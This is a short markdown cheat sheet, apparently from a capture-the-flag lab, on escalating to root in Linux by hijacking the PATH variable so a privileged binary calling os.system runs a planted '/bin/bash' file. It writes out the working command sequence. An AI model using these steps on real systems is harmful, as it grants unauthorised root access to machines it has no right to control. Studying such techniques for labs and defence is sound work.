## PATH 

### Stapsgewijs

#### 1. Check the PATH enviromental variable

```
echo $PATH
```

#### 2. Think about these steps:

- What folders are located under $PATH
- Does your current user have write privileges for any of these folders?
- Can you modify $PATH?
- Is there a script/application you can start that will be affected by this vulnerability?

#### 3. Set environment variable to /tmp cause u got write access there

```
export PATH=/tmp:$PATH
```

#### 4. Check for folder permission in the directorys

```
find / -writable -type d 2>/dev/null
```

*Example:*

```
/home/murdoch
```
*Has read permission and has a binary in it with a decompiled script that has this:*

```
os.system(thm)
```

#### 5. Create a thm file, give 777 permission and run the test binary from the /home/murdoch binary

```
touch thm | chmod 777 thm | nano thm
```

*Contents of thm file:*

```
/bin/bash
```

**Giving root access**

